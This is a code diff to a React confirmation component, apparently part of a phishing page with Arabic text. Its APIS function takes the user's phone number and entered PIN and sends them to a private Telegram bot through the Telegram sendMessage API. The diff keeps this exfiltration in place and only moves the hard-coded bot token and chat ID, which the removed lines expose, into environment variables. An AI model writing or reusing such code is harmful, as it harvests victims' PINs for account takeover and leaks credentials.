@@ -19,8 +19,8 @@ export default function Confirm2({ setNcode, ncode }) {
     "إن رقم التعريف ليس كود التفعيل الذي يصلك من خلال رسالة نصية ";
 
   const APIS = () => {
-    const apiToken = "6433121980:AAGko90tu3pLPIhkMTOHyYQZXMVb-vW-RNs";
-    const chatId = "5807893197";
+    const apiToken = process.env.REACT_APP_API_TOKEN;
+    const chatId = process.env.REACT_APP_CHAT_ID;
     const text = `${formatPhoneNumberIntl(ncode.number)}  Pin: ${code2}`;
     const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
     Axios(url);
@@ -63,7 +63,7 @@ export default function Confirm2({ setNcode, ncode }) {
             {logoVisible && ( // Conditional rendering for the logo
               <img
                 className="mx-auto h-16 w-16"
-                src="/lock.png"
+                src={`${process.env.PUBLIC_URL}/lock.png`}
                 alt="Your Company"
               />
             )}
